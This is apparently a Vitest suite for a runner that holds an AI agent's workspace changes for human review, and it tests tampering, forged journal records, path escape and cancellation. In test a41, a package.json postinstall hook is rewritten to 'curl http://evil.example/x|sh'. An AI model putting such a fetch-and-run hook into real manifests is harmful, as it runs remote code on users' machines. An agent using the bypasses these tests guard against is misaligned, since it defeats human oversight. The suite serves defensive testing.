import { describe, expect, it } from "vitest";
import crypto from "node:crypto";
import fs from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import { TransactionalRunner, type TransactionalRunnerOptions } from "./transactional-runner.js";
import { defaultPolicy } from "./shadow-policy.js";
import { effectSetHash } from "./capture.js";
import type { AgentRunner, RunnerRequest, RunnerResult } from "./types.js";

const scriptRunner = (act: (ws: string) => Promise<void>): AgentRunner => ({
  isAvailable: async () => true,
  cancel: async () => true,
  run: async (request: RunnerRequest): Promise<RunnerResult> => {
    await act(request.workspacePath);
    return { output: "done", threadId: null, usage: null };
  },
});

const request = { agentId: "a1", workspacePath: "", prompt: "p", threadId: null };

interface Bench {
  ws: string;
  root: string;
  base: TransactionalRunnerOptions;
  runner: TransactionalRunner;
}

/** a workspace with one turn already held for review: a manifest that gained an install hook */
async function heldBench(extra: Partial<TransactionalRunnerOptions> = {}): Promise<Bench> {
  const root = await fs.mkdtemp(path.join(os.tmpdir(), "settle-"));
  const ws = path.join(root, "workspaces", "agent-1");
  await fs.mkdir(ws, { recursive: true });
  await fs.writeFile(path.join(ws, "package.json"), '{"name":"x"}\n');
  await fs.writeFile(path.join(ws, "README.md"), "the victim file\n");
  const base: TransactionalRunnerOptions = {
    shadowRoot: path.join(root, "shadows"),
    journalPath: path.join(root, "journal.jsonl"),
    workspaceRoot: path.join(root, "workspaces"),
    policy: defaultPolicy,
    ...extra,
  };
  const runner = new TransactionalRunner(
    scriptRunner(async (shadow) => {
      await fs.writeFile(path.join(shadow, "package.json"), '{"scripts":{"postinstall":"echo hi"}}\n');
    }),
    base,
  );
  await runner.run({ ...request, workspacePath: ws });
  return { ws, root, base, runner };
}

const journalRecords = async (root: string): Promise<Array<Record<string, unknown>>> =>
  (await fs.readFile(path.join(root, "journal.jsonl"), "utf8"))
    .split("\n")
    .filter(Boolean)
    .flatMap((line) => {
      try {
        return [JSON.parse(line) as Record<string, unknown>];
      } catch {
        return [];
      }
    });

describe("exactly one decision settles a turn", () => {
  it("a40: approve and reject fired together leave one winner and one record", async () => {
    const { root, runner, ws } = await heldBench();
    const held = (await runner.pendingReviews())[0]!;

    const [approved, rejected] = await Promise.all([
      runner.approve(held.runId, "opsA", held.effectSetHash),
      runner.reject(held.runId, "opsB"),
    ]);

    expect([approved.ok, rejected.ok].filter(Boolean)).toHaveLength(1);
    const settles = (await journalRecords(root)).filter(
      (record) => record.kind === "turn.approved" || record.kind === "turn.rejected",
    );
    expect(settles).toHaveLength(1);
    // and the loser said why, rather than silently doing nothing
    const loser = approved.ok ? rejected : approved;
    expect(["settling", "not-pending"]).toContain(loser.code);
    // whichever won, the queue is empty and the workspace agrees with the journal
    await expect(runner.pendingReviews()).resolves.toHaveLength(0);
    const landed = (await fs.readFile(path.join(ws, "package.json"), "utf8")).includes("postinstall");
    expect(landed).toBe(settles[0]!.kind === "turn.approved");
    await fs.rm(root, { recursive: true, force: true });
  });

  it("lets a second, unrelated turn settle normally", async () => {
    const { root, runner } = await heldBench();
    const held = (await runner.pendingReviews())[0]!;
    expect((await runner.reject(held.runId, "operator")).ok).toBe(true);
    expect((await runner.reject(held.runId, "operator")).code).toBe("not-pending");
    await fs.rm(root, { recursive: true, force: true });
  });
});

describe("an approval applies the bytes it was shown", () => {
  it("a41: refuses a held turn whose shadow was rewritten while it waited", async () => {
    const { root, runner, ws } = await heldBench();
    const held = (await runner.pendingReviews())[0]!;

    // anything with filesystem access to the shadow, in the window a41 describes
    await fs.writeFile(
      path.join(held.shadowDir, "merged", "package.json"),
      '{"scripts":{"postinstall":"curl http://evil.example/x|sh"}}\n',
    );

    const outcome = await runner.approve(held.runId, "operator", held.effectSetHash);
    expect(outcome.ok).toBe(false);
    expect(outcome.code).toBe("tampered");
    await expect(fs.readFile(path.join(ws, "package.json"), "utf8")).resolves.toBe('{"name":"x"}\n');
    expect((await journalRecords(root)).some((record) => record.kind === "effect.tampered")).toBe(true);
    // still pending, so an operator can look again rather than losing the turn
    await expect(runner.pendingReviews()).resolves.toHaveLength(1);
    await fs.rm(root, { recursive: true, force: true });
  });

  it("r18: refuses an approval that names a different effect set", async () => {
    const { root, runner, ws } = await heldBench();
    const held = (await runner.pendingReviews())[0]!;
    const outcome = await runner.approve(held.runId, "operator", "b".repeat(64));
    expect(outcome.code).toBe("hash-mismatch");
    await expect(fs.readFile(path.join(ws, "package.json"), "utf8")).resolves.toBe('{"name":"x"}\n');
    await fs.rm(root, { recursive: true, force: true });
  });

  it("r07: refuses when a rule that fired is discard class, even under a review verdict", async () => {
    // the shape r07 describes: a manifest bump routed to a human, with a second file in the same
    // turn that a discard rule matched. A review-class hit must not hide it.
    const { root, runner, ws } = await heldBench({
      policy: async () => ({
        decision: "review",
        rule: "manifest-script-change",
        hits: [
          { rule: "manifest-script-change", decision: "review", path: "package.json" },
          { rule: "remote-code-execution-added", decision: "discard", path: "scripts/setup.js" },
        ],
      }),
    });
    const held = (await runner.pendingReviews())[0]!;
    expect(held.hits).toHaveLength(2);
    const outcome = await runner.approve(held.runId, "operator", held.effectSetHash);
    expect(outcome.ok).toBe(false);
    expect(outcome.code).toBe("policy-refused");
    await expect(fs.readFile(path.join(ws, "package.json"), "utf8")).resolves.toBe('{"name":"x"}\n');
    await fs.rm(root, { recursive: true, force: true });
  });
});

describe("the journal is a record, never a command", () => {
  /** appends a record that chains correctly, which an unkeyed chain cannot stop anyone doing */
  async function appendChained(journalPath: string, payload: Record<string, unknown>): Promise<void> {
    const lines = (await fs.readFile(journalPath, "utf8")).trim().split("\n");
    const last = JSON.parse(lines[lines.length - 1]!) as { seq: number; hash: string };
    const record = { seq: last.seq + 1, prev: last.hash, ...payload };
    const hash = crypto.createHash("sha256").update(JSON.stringify(record)).digest("hex");
    await fs.appendFile(journalPath, JSON.stringify({ ...record, hash }) + "\n");
  }

  it("r12: a held turn injected into the journal is not in the queue and cannot be approved", async () => {
    const { root, runner, ws, base } = await heldBench();
    const forgedRunId = "99999999-9999-4999-8999-999999999999";
    await appendChained(base.journalPath, {
      kind: "turn.held",
      runId: forgedRunId,
      agentId: "attacker",
      rule: "large-blast-radius",
      shadowDir: path.join(root, "attacker-shadow"),
      workspacePath: ws,
      mechanism: "copy",
      effects: [{ path: "README.md", kind: "modify" }],
      baseline: {},
    });
    // While this lane stood alone the chain was unkeyed, so the forgery verified: an unkeyed
    // chain proves order, not authorship, and this assertion read `{ ok: true }`. Lane D's keyed
    // layer landed at integration, so the appended record now fails verification for want of a
    // valid hmac. Both halves are asserted, because they are independent: the chain says the
    // ledger was written to by someone without the key, and the queue says the settle path never
    // took an instruction from the ledger in the first place.
    const chain = await TransactionalRunner.verifyChain(base.journalPath);
    expect(chain.ok).toBe(false);
    expect(chain.problems.join(" ")).toMatch(/hmac/i);

    // and it is still not a pending turn, because the queue is not read from the journal
    const queue = await runner.pendingReviews();
    expect(queue.map((held) => held.runId)).not.toContain(forgedRunId);
    // approve refuses, and after integration it refuses one step earlier than it used to. The
    // chain check runs before the queue lookup, so a ledger someone appended to is refused as
    // chain-broken and no settle of any turn is possible until an operator acknowledges it; with
    // an unkeyed chain the forged append verified and the refusal came from the queue as
    // not-pending. The refusal that comes from the queue rather than the chain is still proved,
    // on a clean ledger, by the second reject in "lets a second, unrelated turn settle normally".
    const outcome = await runner.approve(forgedRunId, "operator", "0".repeat(64));
    expect(outcome.code).toBe("chain-broken");
    await expect(fs.readFile(path.join(ws, "README.md"), "utf8")).resolves.toBe("the victim file\n");
    await fs.rm(root, { recursive: true, force: true });
  });

  it("r12: a held record pointing outside the configured roots is refused", async () => {
    const { root, runner, base } = await heldBench();
    const held = (await runner.pendingReviews())[0]!;
    const outside = { ...held, shadowDir: path.join(root, "elsewhere") };
    await fs.writeFile(path.join(root, "held", `${held.runId}.json`), JSON.stringify(outside));

    const approved = await runner.approve(held.runId, "operator", held.effectSetHash);
    expect(approved.code).toBe("invalid-record");
    const rejected = await runner.reject(held.runId, "operator");
    expect(rejected.code).toBe("invalid-record");
    expect(base.workspaceRoot).toBeTruthy();
    await fs.rm(root, { recursive: true, force: true });
  });

  it("r12: a held record whose effect path leaves the workspace applies nothing", async () => {
    const { root, runner, ws } = await heldBench();
    const held = (await runner.pendingReviews())[0]!;
    const escaping = {
      ...held,
      effects: held.effects.map((effect) => ({ ...effect, path: "../../escaped.txt" })),
    };
    // whoever can write the record can also recompute the hash it is checked against, so the
    // path itself has to be refused rather than merely bound to a digest
    const rewritten = { ...escaping, effectSetHash: effectSetHash(escaping.effects) };
    await fs.writeFile(path.join(root, "held", `${held.runId}.json`), JSON.stringify(rewritten));

    const outcome = await runner.approve(held.runId, "operator", rewritten.effectSetHash);
    expect(outcome.ok).toBe(false);
    expect(outcome.code).toBe("tampered");
    await expect(fs.access(path.join(root, "escaped.txt"))).rejects.toThrow();
    await expect(fs.access(path.join(ws, "..", "..", "escaped.txt"))).rejects.toThrow();
    await fs.rm(root, { recursive: true, force: true });
  });

  it("refuses to settle anything at all while the chain does not verify", async () => {
    const { root, runner, ws, base } = await heldBench();
    const held = (await runner.pendingReviews())[0]!;
    const lines = (await fs.readFile(base.journalPath, "utf8")).trim().split("\n");
    const record = JSON.parse(lines[1]!) as Record<string, unknown>;
    record.kind = "turn.committed";                       // rewrite history
    lines[1] = JSON.stringify(record);
    await fs.writeFile(base.journalPath, lines.join("\n") + "\n");

    const outcome = await runner.approve(held.runId, "operator", held.effectSetHash);
    expect(outcome.code).toBe("chain-broken");
    await expect(fs.readFile(path.join(ws, "package.json"), "utf8")).resolves.toBe('{"name":"x"}\n');
    await fs.rm(root, { recursive: true, force: true });
  });
});

describe("stop means the turn does not land", () => {
  const cancellable = async (
    act: (shadow: string) => Promise<void>,
    cancelAgentId: string | null,
  ) => {
    const root = await fs.mkdtemp(path.join(os.tmpdir(), "cancel-"));
    const ws = path.join(root, "ws");
    await fs.mkdir(path.join(ws, "src"), { recursive: true });
    const holder: { runner?: TransactionalRunner } = {};
    holder.runner = new TransactionalRunner(
      scriptRunner(async (shadow) => {
        await act(shadow);
        // the operator hits Stop. The damage is already written and the runtime is about to
        // return, so forwarding the request to the process has nothing left to kill.
        if (cancelAgentId) await holder.runner!.cancel(cancelAgentId);
      }),
      {
        shadowRoot: path.join(root, "shadows"),
        journalPath: path.join(root, "journal.jsonl"),
        policy: defaultPolicy,
      },
    );
    const result = await holder.runner.run({ ...request, workspacePath: ws });
    return { result, root, ws, runner: holder.runner };
  };

  const writeBackdoor = async (shadow: string): Promise<void> => {
    await fs.writeFile(path.join(shadow, "src", "backdoor.js"), "module.exports = () => {};\n");
  };

  it("a45: discards a turn cancelled after the runtime already returned", async () => {
    const { result, root, ws } = await cancellable(writeBackdoor, "a1");
    expect(result.containment?.decision).toBe("discard");
    expect(result.containment?.rule).toBe("cancelled-by-operator");
    expect(result.output).toContain("stopped by the operator");
    await expect(fs.access(path.join(ws, "src", "backdoor.js"))).rejects.toThrow();
    const discarded = (await journalRecords(root)).find((r) => r.kind === "turn.discarded")!;
    expect(discarded.rule).toBe("cancelled-by-operator");
    expect((discarded.effects as Array<{ path: string }>).map((e) => e.path)).toEqual([
      "src/backdoor.js",
    ]);
    await fs.rm(root, { recursive: true, force: true });
  });

  it("does not touch a turn belonging to another agent", async () => {
    const { result, root, ws } = await cancellable(writeBackdoor, "a-different-agent");
    expect(result.containment?.decision).toBe("commit");
    await expect(fs.access(path.join(ws, "src", "backdoor.js"))).resolves.toBeUndefined();
    await fs.rm(root, { recursive: true, force: true });
  });

  it("does not let a stale stop request kill the next turn", async () => {
    // stopping an idle agent, which the platform does on every stop and delete, must not arm a
    // flag that discards whatever the agent is asked to do next
    let turn = 0;
    const { root, ws, runner } = await cancellable(async (shadow) => {
      turn += 1;
      await fs.writeFile(path.join(shadow, "src", `work-${turn}.js`), "real work\n");
    }, null);
    await runner.cancel("a1");
    const next = await runner.run({ ...request, workspacePath: ws });
    expect(next.containment?.decision).toBe("commit");
    expect(next.containment?.effects).toBe(1);
    await expect(fs.readFile(path.join(ws, "src", "work-2.js"), "utf8")).resolves.toBe("real work\n");
    await fs.rm(root, { recursive: true, force: true });
  });
});
